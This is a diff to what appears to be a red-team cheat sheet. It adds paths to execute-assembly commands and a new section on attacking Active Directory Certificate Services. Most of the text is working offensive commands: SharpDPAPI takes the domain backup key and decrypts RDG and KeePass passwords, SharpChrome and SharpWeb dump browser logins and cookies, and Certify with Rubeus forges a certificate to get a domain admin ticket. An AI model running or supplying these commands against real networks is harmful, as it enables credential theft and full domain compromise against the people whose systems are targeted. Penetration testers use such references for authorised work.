@@ -268,29 +268,44 @@ syscalls_shinject <PIX> C:\beacon.bin
 [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
 ```
 # SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)
-execute-assembly SharpDPAPI.exe backupkey /file:key.pvk
+execute-assembly C:\SharpDPAPI.exe backupkey /file:key.pvk
 
 # Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)
-execute-assembly SharpDPAPI.exe rdg /pvk:key.pvk /unprotect
+execute-assembly C:\SharpDPAPI.exe rdg /pvk:key.pvk /unprotect
 
 # Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)
-execute-assembly SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
+execute-assembly C:\SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
 ```
 
 SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 ```
 # Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)
-execute-assembly SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com
+execute-assembly C:\SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com
 
 # Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)
 # Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor
-execute-assembly SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com /format:json
+execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com /format:json
 ```
 
 ### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge
 ```
 # Retrive all saved browser credentials
 execute-assembly C:\SharpWeb.exe all
+```
+
+### Active Directory Certificate Services (AD CS) Attack
+[Certify - GhostPack](https://github.com/GhostPack/Certify)
+```
+# Enumerate and abuse misconfigurations in AD CS
+
+# Find vulnerable certificates with Certify.exe
+execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com
+
+# Request a new certificate for a vulnerable template from the above output 
+execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1
+
+# Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus.exe
+execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
 ```
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
